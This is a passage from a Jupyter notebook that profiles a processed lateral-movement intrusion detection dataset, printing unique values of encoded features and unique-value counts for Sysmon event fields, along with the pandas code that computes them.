'DestinationPort_binary_15': ['0', 'nan', '1'], 'ProcessId_binary_0': ['0', 'nan', '1'], 'ProcessId_binary_1': ['0', 'nan', '1'], 'ProcessId_binary_2': ['0', 'nan', '1'], 'ProcessId_binary_3': ['0', 'nan', '1'], 'ProcessId_binary_4': ['0', 'nan', '1'], 'ProcessId_binary_5': ['0', 'nan', '1'], 'ProcessId_binary_6': ['0', 'nan', '1'], 'ProcessId_binary_7': ['0', 'nan', '1'], 'ProcessId_binary_8': ['0', 'nan', '1'], 'ProcessId_binary_9': ['0', 'nan', '1'], 'ProcessId_binary_10': ['0', 'nan', '1'], 'ProcessId_binary_11': ['0', 'nan', '1'], 'ProcessId_binary_12': ['0', 'nan', '1'], 'ProcessId_binary_13': ['0', 'nan', '1'], 'ProcessId_binary_14': ['0', 'nan', '1'], 'ProcessId_binary_15': ['0', 'nan', '1'], 'Description_tfidf_198': ['nan', '0.4995930755604419', '0.5515110139471893', '0.4056689306164255', '0.5022586117445703', '0', '0.3910475101895148', '0.5400230016558445', '1', '0.328765661617324'], 'Description_tfidf_199': ['nan', '0', '1.0', '0.5355433714440786', '1', '0.0'], 'Description_tfidf_200': ['nan', '0.5514350193755396', '0.5292995982402695', '0', '0.5529286939288685', '1', '0.0'], 'Description_tfidf_201': ['nan', '0.7499457624904682', '0', '1', '0.5557148073311955', '0.0'], 'Description_tfidf_202': ['nan', '0', '0.5495734347865395', '0.5', '1', '0.0'], 'Description_tfidf_203': ['nan', '0.5197646144677307', '0', '0.725691924165561', '1', '0.0'], 'Description_tfidf_204': ['0.3748980118006671', 'nan', '0.5571376833421978', '0', '1', '0.0'], 'Description_tfidf_205': ['nan', '0', '0.3798328870434758', '0.7488789161432898', '1', '0.0'], 'Description_tfidf_206': ['nan', '0.784456205613417', '0', '0.5107603241600465', '0.4471405084691947', '1', '0.0'], 'Description_tfidf_207': ['nan', '0.7369014737565478', '0', '0.5959252232831991', '0.6800549286590192', '1', '0.0', '0.4404337013081736'], 'Description_tfidf_208': ['nan', '0.781925531350407', '0', '0.7492007160684404', '1', '0.5641134351991994', '0.0'], 'Description_tfidf_209': ['nan', '0.7551288508360893', '0', '0.5796773541097503', '1', '0.0'], 'Description_tfidf_210': ['nan', '0', '0.4506456357694011', '1', '0.3334869679659735', '0.5608187951228312', '0.3845473955871179', '0.0', '0.4829062585875363', '0.5240389059399814'], 'Description_tfidf_211': ['nan', '0.5790004211609039', '0', '1', '0.0', '0.5568715639441717'], 'Description_tfidf_212': ['nan', '0', '0.682383941696141', '0.6611497477766993', '1', '0.0'], 'Description_tfidf_213': ['nan', '0', '0.464971926014355', '1', '0.0', '0.4525558115415694'], 'Description_tfidf_214': ['nan', '0.5773502691896258', '0', '1', '0.4911251068634023', '0.0'], 'Description_tfidf_215': ['nan', '0.6624563995780818', '0', '1', '0.5888761581433657', '0.0'], 'Description_tfidf_216': ['nan', '0.3579617015775619', '0.5405718947867423', '0', '0.5355787896792545', '0.663411490521429', '0.3765949831012435', '1', '0.0', '0.5219332979149681'], 'Description_tfidf_217': ['nan', '0.5883825740909882', '0', '0.721475010776613', '1', '0.0'], 'Description_tfidf_218': ['0.261547778260854', 'nan', '0.592057347778808', '0', '0.5912853720166983', '0.4652439043657539', '0.3955046315742778', '0.4972946650719546', '1', '0.0'], 'Description_tfidf_219': ['nan', '0.4713580205901866', '0.4087863014769101', '0.7795943167026224', '0', '1', '0.0', '0.5581718845451762'], 'Description_tfidf_220': ['nan', '0.5776011909821258', '0.6052498079787018', '0', '0.4152948052745288', '0.5063423191457963', '1', '0.0'], 'Description_tfidf_221': ['0.3728604498247964', 'nan', '0.5671062902631613', '0.5408527127438348', '0.4395143565012551', '0', '0.5593744119021609', '0.4496117430173721', '0.7537988857710356', '1'], 'Description_tfidf_222': ['nan', '0.4695775051817161', '0.3685545712256436', '0.3360354042190731', '0.7076196717712547', '0.3145211158643408', '0.6377747671714251', '0.3397247179437631', '0.0', '0.3491406976525959'], 'Description_tfidf_223': ['nan', '0.4341384740185948', '0.3437732965593136', '0.5070566358298514', '0.1321975114006113', '0.3421539166885747', '0.2689869593026306', '0.4584834090846683', '0.2845843805378628', '0.5140458714855579'], 'Description_tfidf_224': ['nan', '0', '0.3270943639043522', '0.6306341780022575', '1', '0.4422467479653296', '0.0', '0.5331516287990304'], 'Description_tfidf_225': ['0.5467608356181485', 'nan', '0', '0.705359720955414', '1', '0.646772214840922', '0.0'], 'Description_tfidf_226': ['nan', '0', '1.0', '0.6443253343381513', '0.7393751830092592', '0.5695260656720902', '1', '0.0'], 'Description_tfidf_227': ['nan', '0.7174476553721777', '0.4661988559399402', '0.6277120533416138', '0.8973180647242817', '0', '1.0', '1', '0.0', '0.6796079963893225'], 'Description_tfidf_228': ['nan', '0', '1.0', '0.7211998708471626', '1', '0.5038354164946025', '0.0', '0.5076752892054487', '0.6157742348441944', '0.9062661368226644'], 'Description_tfidf_229': ['nan', '0', '0.8987186572549507', '1', '0.5296471387299279', '0.0'], 'Description_tfidf_230': ['nan', '0.5093559652282438', '0', '1', '0.0', '0.6283168985169216'], 'Description_tfidf_231': ['nan', '0', '0.907563264556629', '1', '0.6489071683391648', '0.587987312617624', '0.0'], 'Description_tfidf_232': ['nan', '0.5213918412004918', '0', '0.5456590366026652', '1', '0.0'], 'Description_tfidf_233': ['nan', '0', '1.0', '0.5237869941091697', '1', '0.0'], 'Description_tfidf_234': ['0.4488201640400915', 'nan', '0.7750308773667669', '0.6008295103328122', '0', '0.673319139356002', '1', '0.0', '0.8123962909165593'], 'Description_tfidf_235': ['0.3748980118006671', 'nan', '0', '0.5220449890184059', '1', '0.0'], 'Description_tfidf_236': ['0.470547661697783', 'nan', '0.9049403525258486', '0', '1', '0.0'], 'Description_tfidf_237': ['nan', '0', '0.6573693506857228', '0.3798328870434758', '1', '0.0'], 'Description_tfidf_238': ['0.4871427449726066', 'nan', '0', '0.5215968087281899', '1', '0.0'], 'Description_tfidf_239': ['nan', '0.6769735562743675', '0.3387724857610171', '0', '0.3934303478297551', '0.5239357617004079', '1', '0.0'], 'Description_tfidf_240': ['nan', '0.5221070082738278', '0', '1', '0.5466042146006942', '0.0'], 'Description_tfidf_241': ['nan', '0.739466873610651', '0', '0.6921361498981885', '0.5225246920436047', '1', '0.0'], 'Description_tfidf_242': ['nan', '0.7764690473795691', '0', '1', '0.0', '0.7379016994274683', '0.5981162597744202'], 'Description_tfidf_243': ['nan', '0', '0.5395740872736965', '0.662376112091109', '1', '0.0'], 'Description_tfidf_244': ['0.5377059719641689', 'nan', '0', '0.6803492410891239', '1', '0.7047791598163613', '0.0'], 'Description_tfidf_245': ['nan', '0.5900070389347402', '0.5917961549719091', '0', '1', '0.0'], 'Description_tfidf_246': ['nan', '0', '0.5561282588977239', '0.5198783713387514', '1', '0.0', '0.6779447367447474'], 'Description_tfidf_247': ['nan', '0', '0.5529286939288685', '0.6810392786608965', '1', '0.0'], 'Description_tfidf_248': ['nan', '0.6908467313982579', '0.5544756492019965', '0.5352467613015638', '0', '0.4845560808745748', '1', '0.7047791598163613', '0.0'], 'Description_tfidf_249': ['nan', '0', '1', '0.600420403486988', '0.0', '0.5981162597744202'], 'Description_tfidf_250': ['0.6540163429038666', 'nan', '0.4970779703425078', '0', '0.4692199117824757', '0.6049520475860353', '1', '0.0'], 'Description_tfidf_251': ['nan', '0', '0.5495734347865395', '1', '0.0', '0.710613933813291'], 'Description_tfidf_252': ['nan', '0', '0.534779671408609', '1', '0.4811546368112021', '0.0', '0.6458488093493621', '0.5325650546267325', '0.6047069201860436'], 'Description_tfidf_253': ['0.5654238570462728', 'nan', '0.6583374833986989', '0', '0.6181899644545304', '1', '0.0'], 'Description_tfidf_254': ['nan', '0.6763114612141804', '0.5647316112533409', '0', '0.5434599097976189', '1', '0.0', '0.6032411263567865'], 'Description_tfidf_255': ['nan', '0.6411119951123931', '0.5208485939269996', '0', '0.5012852985831331', '0.8099090733983789', '0.4031637832208513', '1', '0.4255207772583004', '0.0'], 'Description_tfidf_256': ['0.5246508390478645', 'nan', '0.5986135359348032', '0', '0.6025761767460474', '1', '0.6594538292559976', '0.0', '0.8029272580317245'], 'Description_tfidf_257': ['nan', '0.4931870418357522', '0.6430594388910653', '0', '0.4787156038032458', '0.5214920303568793', '0.5307583906678026', '1', '0.8834442097358305', '0.4552371623459894'], 'Description_tfidf_258': ['nan', '0.6675052969120417', '0.5645166331436621', '0', '1', '0.8117598980038714', '0.0', '0.5322815694641929'], 'Description_tfidf_259': ['nan', '0.6688391170024061', '0.5694216033794156', '0', '0.345144877407995', '1', '0.0'], 'Description_tfidf_260': ['nan', '0', '1.0', '0.2509272106474632', '0.736963538027075', '0.2506516624094527', '1', '0.0'], 'Description_tfidf_261': ['nan', '0.6364254543693927', '0.5986135359348032', '0', '1', '0.0'], 'Description_tfidf_262': ['nan', '0.2184041055734295', '0', '0.3639724239020578', '0.3651880071541631', '0.397720937785863', '0.2112074854165948', '1', '0.0', '0.4831836040651258'], 'Description_tfidf_263': ['0.3384632074177214', 'nan', '0.3727813613073564', '0.4365145450929173', '0.383719653022017', '0.0', '0.4339086901288891', '0.4911423421171906', '0.549919368126343', '0.5101438748180815'], 'Description_tfidf_264': ['nan', '0.5441976040193577', '0.5612100353330018', '0', '1', '0.0'], 'Description_tfidf_265': ['nan', '0', '0.500269193247003', '0.5002532697632396', '1', '0.0'], 'Description_tfidf_266': ['nan', '0.4145398777332585', '0', '0.7475519119470408', '1', '0.8790958412287134', '0.0', '0.5399669436908149', '0.4680074109412441'], 'Description_tfidf_267': ['nan', '0', '0.5446620024460633', '0.4614161867054864', '1', '0.600420403486988', '0.0', '0.6183086179281089'], 'Description_tfidf_268': ['nan', '0.8609079232781496', '0.6702115118365494', '0.4901470521818354', '0', '0.405572673489484', '0.3247724110957738', '0.4004102326563151', '0.5673277775572612', '0.3650743383442034'], 'Description_tfidf_269': ['nan', '0.5917961549719091', '0', '1', '0.0', '0.6469155719126002'], 'Description_tfidf_270': ['0.3372141347053604', 'nan', '0.4568956872106059', '0.3808711157182962', '0.4500849634355181', '0', '0.4058816360238307', '1', '0.7094267656978724', '0.47046451971509'], 'Description_tfidf_271': ['0.4689537839688009', 'nan', '0.5883825740909882', '0', '1', '0.0'], 'Description_tfidf_272': ['nan', '0', '0.3375529103505252', '0.3869227260837289', '0.8128501444048684', '0.4077177089704437', '0.3018773685100746', '1', '0.7094267656978724', '0.7626224774789353'], 'Description_tfidf_273': ['nan', '0', '1.0', '0.4674606259930389', '1', '0.0'], 'Description_tfidf_274': ['nan', '0.6670575701827204', '0.3397582072896728', '0.4841768809120259', '0', '0.5198135487537483', '1', '0.0'], 'Description_tfidf_275': ['nan', '0', '1.0', '1', '0.0'], 'Description_tfidf_276': ['nan', '0.2800978717642337', '0.4001132111303539', '0.3180846641474453', '0.3064426852296782', '0', '1.0', '0.3788779775559351', '0.4490771246899568', '0.500008680991566'], 'Description_tfidf_277': ['nan', '0', '1', '0.0', '0.5685686690457904', '0.8588579221959227'], 'Description_tfidf_278': ['0.4689537839688009', 'nan', '0', '1.0', '1', '0.0'], 'Description_tfidf_279': ['0.2794259450477528', 'nan', '0.5615150618079908', '0.2877665343474582', '0.5276242140857235', '0.3844068158205014', '0.570040148185713', '0.3525879638994872', '0.3584717680445108', '0.3775293159916504'], 'Description_tfidf_280': ['nan', '0', '0.4674606259930389', '1', '0.5296471387299279', '0.0'], 'Description_tfidf_281': ['nan', '0.5892191473768976', '0', '0.5215968087281899', '1', '0.0'], 'Description_tfidf_282': ['nan', '0.5612100353330018', '0.4387320730183357', '0', '0.475994303763979', '0.5955535448151956', '0.5598614101415968', '0.5658168369901935', '1', '0.5175659220346076'], 'Description_tfidf_283': ['nan', '0', '0.8387524914293145', '1', '0.5038354164946025', '0.0'], 'Description_tfidf_284': ['nan', '0', '0.4313539102445701', '1', '0.6120624957514432', '0.0'], 'Description_tfidf_285': ['nan', '0.563552651107355', '0.5604047278153595', '0', '0.6366871360795814', '0.6674915868542988', '0.481944200942616', '1', '0.0'], 'Description_tfidf_286': ['0.8330294725942635', 'nan', '0', '1.0', '1', '0.0'], 'Description_tfidf_287': ['nan', '0.5708421542242875', '0.6212423239448945', '0', '1', '0.6663146972404789', '0.0', '0.4219339103145202'], 'Description_tfidf_288': ['nan', '0.2219958526287754', '0.2857441034241663', '0.3001950878162959', '0.2927348093964736', '0.3318763890773119', '0.3133673760430532', '0.2843061664391744', '0.3515042487739295', '0.3581182293478616'], 'Description_tfidf_289': ['nan', '0.3511407441221', '0.3089890386122084', '0.3543475091831957', '0.2229210594701576', '0.4111452969199325', '0.1919514390838593', '0.3654677138484974', '0.2920903930397847', '0.3933449524936371'], 'Description_tfidf_290': ['nan', '0', '1', '0.8288737028439592', '0.5160548267948627', '0.0', '0.7984906574996301'], 'Description_tfidf_291': ['nan', '0', '1.0', '1', '0.7025964535481214', '0.0', '0.7421701485520465'], 'Description_tfidf_292': ['nan', '0', '0.253301112237522', '0.2535795730882987', '1', '0.0'], 'Description_tfidf_293': ['0.3509223197805017', 'nan', '0.3364841494436725', '0', '0.278787436227318', '0.7689411077787356', '1', '0.4088591785817915', '0.0', '0.6260462658023283'], 'Description_tfidf_294': ['nan', '0.6868358571165656', '0', '0.6897990667813707', '1', '0.0'], 'Description_tfidf_295': ['nan', '0', '0.5461221879558283', '0.4918927581259744', '0.5286218045965957', '1', '0.5574870661802058', '0.0'], 'Description_tfidf_296': ['nan', '0.5773502691896258', '0.6502146377164213', '0', '1', '0.0'], 'Description_tfidf_297': ['nan', '0', '0.253301112237522', '0.2535795730882987', '1', '0.0'], 'Description_tfidf_298': ['nan', '0', '0.8887029670222222', '0.5985644131564245', '1', '0.0'], 'Description_tfidf_299': ['nan', '0.4145398777332585', '0', '1', '0.6068124317521646', '0.0'], 'Product_tfidf_28': ['nan', '0', '1', '0.5020246563771575', '0.0', '0.8187021872123358'], 'Product_tfidf_29': ['nan', '0.62456883780533', '0', '1', '0.0', '0.3207577252480183', '0.5002139837373293'], 'Product_tfidf_30': ['0.4472135954999579', 'nan', '0', '1', '0.6074670956341428', '0.0'], 'Product_tfidf_31': ['0.4472135954999579', 'nan', '0', '1', '0.6600647724199762', '0.0'], 'Product_tfidf_32': ['nan', '0', '0.6572413780113505', '1', '0.0', '0.6605599476342134'], 'Product_tfidf_33': ['nan', '0', '0.7521279312814027', '1', '0.0', '0.6539270199483892'], 'Product_tfidf_34': ['nan', '0', '1.0', '0.7735304934911523', '1', '0.0'], 'Product_tfidf_35': ['nan', '0.4649549654262759', '0', '1.0', '0.5', '1', '0.0'], 'Product_tfidf_36': ['nan', '0', '0.5', '1', '0.9743233263438158', '0.0', '0.4596579412722459'], 'Product_tfidf_37': ['nan', '0.9615511029043452', '0', '1', '0.5773502691896257', '0.0'], 'Product_tfidf_38': ['nan', '0', '0.6805160746571647', '1', '0.5773502691896257', '0.0'], 'Product_tfidf_39': ['0.6808088232789354', 'nan', '0', '0.8880090184554797', '1', '0.0'], 'Product_tfidf_40': ['nan', '0.4649549654262759', '0', '0.8891048727479495', '0.5', '1', '0.0'], 'Product_tfidf_41': ['nan', '0', '0.6073792273034763', '0.5', '1', '0.0', '0.4596579412722459'], 'Product_tfidf_42': ['nan', '0.7071067811865476', '0', '0.6073792273034763', '1', '0.0'], 'Product_tfidf_43': ['nan', '0', '1.0', '1', '0.0'], 'Product_tfidf_44': ['nan', '0.5604904296174216', '0', '0.6875862718498964', '0.6779073259514095', '1', '0.0'], 'Product_tfidf_45': ['nan', '0.659017127991646', '0', '0.691563783358511', '0.633759083279549', '1', '0.699357678641707', '0.0'], 'Product_tfidf_46': ['nan', '0', '1', '0.7147718778217867', '0.7223153975562631', '0.0'], 'Product_tfidf_47': ['nan', '0.5000527815684143', '0', '1', '0.5019290340713988', '0.0', '0.2173437588562746', '0.1646642872225137', '0.3206543558047654'], 'Product_tfidf_48': ['nan', '0', '0.5', '1', '0.5773502691896257', '0.0', '0.4596579412722459'], 'Product_tfidf_49': ['nan', '0.4649549654262759', '0.625074854460168', '0', '0.5', '1', '0.0'], 'Product_tfidf_50': ['nan', '0.6657866197133253', '0', '1', '0.5773502691896257', '0.0'], 'Product_tfidf_51': ['nan', '0.6446662522717875', '0', '1', '0.7071067811865475', '0.0'], 'Product_tfidf_52': ['0.4472135954999579', 'nan', '0', '0.6647606274351031', '1', '0.0'], 'Product_tfidf_53': ['nan', '0', '0.6875862718498964', '1', '0.7071067811865475', '0.0'], 'Product_tfidf_54': ['0.4472135954999579', 'nan', '0', '1', '0.0'], 'Product_tfidf_55': ['nan', '0.5604904296174216', '0', '0.6779073259514095', '1', '0.0', '0.8277491729117571'], 'Product_tfidf_56': ['0.4472135954999579', '0.5481700629307155', '0.3406343078450998', 'nan', '0', '0.5118275641694559', '0.7714577013168424', '1', '0.0'], 'Product_tfidf_57': ['nan', '0.2746260666860264', '0', '0.8270271038722535', '1', '0.0', '0.5008457656395496'], 'Product_tfidf_58': ['nan', '0.5048591735206234', '0', '1.0', '1', '0.0'], 'Product_tfidf_59': ['nan', '0.4851305440149274', '0.3083384533613093', '0', '0.4688576902270013', '1', '0.5773502691896257', '0.0', '0.5059194796117918'], 'Product_tfidf_60': ['nan', '0', '0.2251534049094572', '1', '0.0', '0.5019724932418388', '0.6605599476342134'], 'Company_tfidf_12': ['nan', '0', '0.4508720695764156', '0.3338793696181397', '1', '0.0'], 'Company_tfidf_13': ['nan', '0.7071067811865476', '0', '1', '0.7071067811865475', '0.0'], 'Company_tfidf_14': ['0.4472135954999579', 'nan', '0.3067269666476378', '0.7072976054025438', '0', '1', '0.0'], 'Company_tfidf_15': ['nan', '0.7020554211102584', '0', '0.4508720695764156', '1.0', '1', '0.0', '0.2382962006335987'], 'Company_tfidf_16': ['nan', '0.9267230512091212', '0.4322701788274544', '0', '0.6677587392362795', '1', '0.0'], 'Company_tfidf_17': ['0.4472135954999579', 'nan', '0', '0.6540559179801269', '1', '0.0'], 'Company_tfidf_18': ['0.4472135954999579', 'nan', '0', '1', '0.7071067811865475', '0.0'], 'Company_tfidf_19': ['nan', '0', '0.3338793696181397', '0.5743767020897188', '0.5348882388663887', '1', '0.0'], 'Company_tfidf_20': ['nan', '0', '1.0', '0.3338793696181397', '1', '0.0'], 'Company_tfidf_21': ['nan', '0', '0.5', '0.8164965809277259', '1', '0.0'], 'Company_tfidf_22': ['nan', '0', '0.6540559179801269', '1', '0.4082482904638629', '0.0'], 'Unnamed: 0': ['1716829', '533069', '209475', '982169', '450351', '860392', '231405', '286696', '1559146', '1180930'], 'Product_tfidf_61': ['nan', '0', '1.0', '1', '0.0'], 'Product_tfidf_62': ['nan', '0', '1', '0.5773502691896257', '0.0'], 'Product_tfidf_63': ['nan', '0', '1', '0.6600647724199762', '0.0'], 'Company_tfidf_23': ['nan', '0', '1', '0.7071067811865475', '0.0'], 'Company_tfidf_24': ['nan', '0', '0.5743767020897188', '0.5348882388663887', '1', '0.0'], 'Company_tfidf_25': ['nan', '0.7071067811865476', '0', '1', '0.0'], 'Company_tfidf_26': ['nan', '0', '1.0', '1', '0.0'], 'Company_tfidf_27': ['nan', '0', '1.0', '1', '0.8538231026542452', '0.0'], 'Company_tfidf_28': ['nan', '0.3338793696181397', '0', '1', '0.0'], 'Company_tfidf_29': ['nan', '0', '0.5', '1', '0.0'], 'Company_tfidf_30': ['nan', '0', '0.5', '1', '0.0'], 'Company_tfidf_31': ['nan', '0', '0.3289324130382244', '1', '0.2969208395953486', '0.0']}\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import pandas as pd\n",
    "from collections import defaultdict\n",
    "\n",
    "# Path to the folder containing the CSV files\n",
    "folder_path = \"F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential_processed\"\n",
    "\n",
    "# Initialize dictionaries to store results\n",
    "unique_counts_processed = defaultdict(int)  # Key: column name, Value: count of unique values\n",
    "unique_values_processed = defaultdict(set)  # Key: column name, Value: set of unique values\n",
    "\n",
    "# Function to process a batch\n",
    "def process_batch(batch, unique_counts_processed, unique_values_processed):\n",
    "    # Coerce inconsistent datatypes to string for uniformity\n",
    "    batch = batch.astype(str)  # Replace applymap with astype for better compatibility\n",
    "    for column in batch.columns:\n",
    "        unique_values_processed[column].update(batch[column].dropna().unique())  # Update unique values\n",
    "        unique_counts_processed[column] = len(unique_values_processed[column])            # Update count of unique values\n",
    "\n",
    "# Read all CSV files in the folder\n",
    "csv_files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if f.endswith('.csv')]\n",
    "\n",
    "# Process each CSV file in chunks\n",
    "for file_index, file_path in enumerate(csv_files, start=1):\n",
    "    print(f\"Processing File {file_index}/{len(csv_files)}: {file_path}\")\n",
    "    chunk_number = 0\n",
    "    for chunk in pd.read_csv(file_path, chunksize=100000, low_memory=False):  # Adjust chunksize as needed\n",
    "        chunk_number += 1\n",
    "        print(f\"  Reading Chunk {chunk_number}...\")\n",
    "        process_batch(chunk, unique_counts_processed, unique_values_processed)\n",
    "\n",
    "# Extract the first 10 unique values for each column\n",
    "first_10_unique_values_processed = {\n",
    "    column: list(values)[:10] for column, values in unique_values_processed.items()\n",
    "}\n",
    "\n",
    "# Convert unique_counts to a regular dictionary\n",
    "unique_counts_processed = dict(unique_counts_processed)\n",
    "\n",
    "# Display results\n",
    "print(\"Unique Counts:\", unique_counts_processed)\n",
    "print(\"\\nFirst 10 Unique Values:\", first_10_unique_values_processed)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SystemTime                     2936042\n",
      "UtcTime                        53834\n",
      "Image                          468\n",
      "CommandLine                    2937\n",
      "CurrentDirectory               78\n",
      "ParentImage                    190\n",
      "ParentCommandLine              433\n",
      "Initiated                      2\n",
      "SourceIsIpv6                   2\n",
      "DestinationIsIpv6              2\n",
      "State                          1\n",
      "ImageLoaded                    299\n",
      "Signed                         2\n",
      "SignatureStatus                1\n",
      "SourceProcessId                344\n",
      "SourceThreadId                 470\n",
      "SourceImage                    44\n",
      "TargetImage                    104\n",
      "CallTrace                      228\n",
      "SourceUser                     9\n",
      "TargetUser                     13\n",
      "TargetFilename                 8091\n",
      "CreationUtcTime                2760\n",
      "TargetObject                   12471\n",
      "Details                        2019\n",
      "PipeName                       16\n",
      "QueryStatus                    9\n",
      "IsExecutable                   2\n",
      "StartFunction                  5\n",
      "PreviousCreationUtcTime        514\n",
      "ID                             4\n",
      "Label                          3\n",
      "binary_Level_0                 2\n",
      "binary_Level_1                 1\n",
      "binary_Level_2                 2\n",
      "binary_Level_3                 2\n",
      "binary_Level_4                 2\n",
      "binary_Level_5                 2\n",
      "binary_Level_6                 2\n",
      "binary_Level_7                 2\n",
      "binary_Task_0                  2\n",
      "binary_Task_1                  2\n",
      "binary_Task_2                  2\n",
      "binary_Task_3                  2\n",
      "binary_Task_4                  2\n",
      "binary_Task_5                  2\n",
      "binary_Task_6                  2\n",
      "binary_Task_7                  2\n",
      "binary_Protocol_0              1\n",
      "binary_Protocol_1              2\n",
      "binary_Protocol_2              2\n",
      "binary_Protocol_3              2\n",
      "binary_Protocol_4              2\n",
      "binary_Protocol_5              2\n",
      "binary_Protocol_6              2\n",
      "binary_Protocol_7              1\n",
      "binary_Version2_0              2\n",
      "binary_Version2_1              2\n",
      "binary_Version2_2              2\n",
      "binary_Version2_3              1\n",
      "binary_Version2_4              2\n",
      "binary_Version2_5              2\n",
      "binary_Version2_6              2\n",
      "binary_Version2_7              1\n",
      "binary_SchemaVersion_0         2\n",
      "binary_SchemaVersion_1         2\n",
      "binary_SchemaVersion_2         2\n",
      "binary_SchemaVersion_3         2\n",
      "binary_SchemaVersion_4         2\n",
      "binary_SchemaVersion_5         2\n",
      "binary_SchemaVersion_6         2\n",
      "binary_SchemaVersion_7         2\n",
      "binary_Signature_0             2\n",
      "binary_Signature_1             2\n",
      "binary_Signature_2             2\n",
      "binary_Signature_3             2\n",
      "binary_Signature_4             2\n",
      "binary_Signature_5             2\n",
      "binary_Signature_6             2\n",
      "binary_Signature_7             2\n",
      "binary_EventType_0             2\n",
      "binary_EventType_1             2\n",
      "binary_EventType_2             2\n",
      "binary_EventType_3             2\n",
      "binary_EventType_4             2\n",
      "binary_EventType_5             2\n",
      "binary_EventType_6             2\n",
      "binary_EventType_7             2\n",
      "binary_Configuration_0         2\n",
      "binary_Configuration_1         2\n",
      "binary_Configuration_2         2\n",
      "binary_Configuration_3         2\n",
      "binary_Configuration_4         2\n",
      "binary_Configuration_5         2\n",
      "binary_Configuration_6         2\n",
      "binary_Configuration_7         2\n",
      "binary_ConfigurationFileHash_0 2\n",
      "binary_ConfigurationFileHash_1 2\n",
      "binary_ConfigurationFileHash_2 2\n",
      "binary_ConfigurationFileHash_3 2\n",
      "binary_ConfigurationFileHash_4 2\n",
      "binary_ConfigurationFileHash_5 2\n",
      "binary_ConfigurationFileHash_6 2\n",
      "binary_ConfigurationFileHash_7 2\n",
      "binary_IntegrityLevel_0        2\n",
      "binary_IntegrityLevel_1        2\n",
      "binary_IntegrityLevel_2        2\n",
      "binary_IntegrityLevel_3        2\n",
      "binary_IntegrityLevel_4        2\n",
      "binary_IntegrityLevel_5        2\n",
      "binary_IntegrityLevel_6        2\n",
      "binary_IntegrityLevel_7        2\n",
      "binary_UserID_0                1\n",
      "binary_UserID_1                1\n",
      "binary_UserID_2                2\n",
      "binary_UserID_3                2\n",
      "binary_UserID_4                2\n",
      "binary_UserID_5                2\n",
      "binary_UserID_6                2\n",
      "binary_UserID_7                2\n",
      "binary_Computer_0              2\n",
      "binary_Computer_1              2\n",
      "binary_Computer_2              2\n",
      "binary_Computer_3              2\n",
      "binary_Computer_4              2\n",
      "binary_Computer_5              2\n",
      "binary_Computer_6              2\n",
      "binary_Computer_7              2\n",
      "binary_RuleName_0              2\n",
      "binary_RuleName_1              2\n",
      "binary_RuleName_2              2\n",
      "binary_RuleName_3              2\n",
      "binary_RuleName_4              2\n",
      "binary_RuleName_5              2\n",
      "binary_RuleName_6              2\n",
      "binary_RuleName_7              2\n",
      "binary_TerminalSessionId_0     2\n",
      "binary_TerminalSessionId_1     2\n",
      "binary_TerminalSessionId_2     2\n",
      "binary_TerminalSessionId_3     2\n",
      "binary_TerminalSessionId_4     2\n",
      "binary_TerminalSessionId_5     2\n",
      "binary_TerminalSessionId_6     2\n",
      "binary_TerminalSessionId_7     2\n",
      "binary_Version_0               2\n",
      "binary_Version_1               2\n",
      "binary_Version_2               2\n",
      "binary_Version_3               2\n",
      "binary_Version_4               2\n",
      "binary_Version_5               2\n",
      "binary_Version_6               2\n",
      "binary_Version_7               2\n",
      "binary_User_0                  2\n",
      "binary_User_1                  2\n",
      "binary_User_2                  2\n",
      "binary_User_3                  2\n",
      "binary_User_4                  2\n",
      "binary_User_5                  2\n",
      "binary_User_6                  2\n",
      "binary_User_7                  2\n",
      "binary_ParentUser_0            2\n",
      "binary_ParentUser_1            2\n",
      "binary_ParentUser_2            2\n",
      "binary_ParentUser_3            2\n",
      "binary_ParentUser_4            2\n",
      "binary_ParentUser_5            2\n",
      "binary_ParentUser_6            2\n",
      "binary_ParentUser_7            2\n",
      "binary_Guid_0                  2\n",
      "binary_Guid_1                  3\n",
      "binary_Guid_2                  2\n",
      "binary_Guid_3                  2\n",
      "binary_Guid_4                  3\n",
      "binary_Guid_5                  3\n",
      "binary_Guid_6                  2\n",
      "binary_Guid_7                  2\n",
      "binary_Guid_8                  2\n",
      "binary_Guid_9                  3\n",
      "binary_Guid_10                 3\n",
      "binary_Guid_11                 3\n",
      "binary_Guid_12                 3\n",
      "binary_Guid_13                 3\n",
      "binary_Guid_14                 3\n",
      "binary_Guid_15                 3\n",
      "binary_ProcessGuid_0           3\n",
      "binary_ProcessGuid_1           3\n",
      "binary_ProcessGuid_2           3\n",
      "binary_ProcessGuid_3           3\n",
      "binary_ProcessGuid_4           3\n",
      "binary_ProcessGuid_5           3\n",
      "binary_ProcessGuid_6           3\n",
      "binary_ProcessGuid_7           3\n",
      "binary_ProcessGuid_8           3\n",
      "binary_ProcessGuid_9           3\n",
      "binary_ProcessGuid_10          3\n",
      "binary_ProcessGuid_11          3\n",
      "binary_ProcessGuid_12          3\n",
      "binary_ProcessGuid_13          3\n",
      "binary_ProcessGuid_14          3\n",
      "binary_ProcessGuid_15          3\n",
      "binary_ParentProcessGuid_0     3\n",
      "binary_ParentProcessGuid_1     3\n",
      "binary_ParentProcessGuid_2     3\n",
      "binary_ParentProcessGuid_3     3\n",
      "binary_ParentProcessGuid_4     3\n",
      "binary_ParentProcessGuid_5     3\n",
      "binary_ParentProcessGuid_6     3\n",
      "binary_ParentProcessGuid_7     3\n",
      "binary_ParentProcessGuid_8     3\n",
      "binary_ParentProcessGuid_9     3\n",
      "binary_ParentProcessGuid_10    3\n",
      "binary_ParentProcessGuid_11    3\n",
      "binary_ParentProcessGuid_12    3\n",
      "binary_ParentProcessGuid_13    3\n",
      "binary_ParentProcessGuid_14    3\n",
      "binary_ParentProcessGuid_15    3\n",
      "binary_SourceProcessGUID_0     3\n",
      "binary_SourceProcessGUID_1     3\n",
      "binary_SourceProcessGUID_2     3\n",
      "binary_SourceProcessGUID_3     3\n",
      "binary_SourceProcessGUID_4     3\n",
      "binary_SourceProcessGUID_5     3\n",
      "binary_SourceProcessGUID_6     3\n",
      "binary_SourceProcessGUID_7     3\n",
      "binary_SourceProcessGUID_8     3\n",
      "binary_SourceProcessGUID_9     3\n",
      "binary_SourceProcessGUID_10    3\n",
      "binary_SourceProcessGUID_11    3\n",
      "binary_SourceProcessGUID_12    3\n",
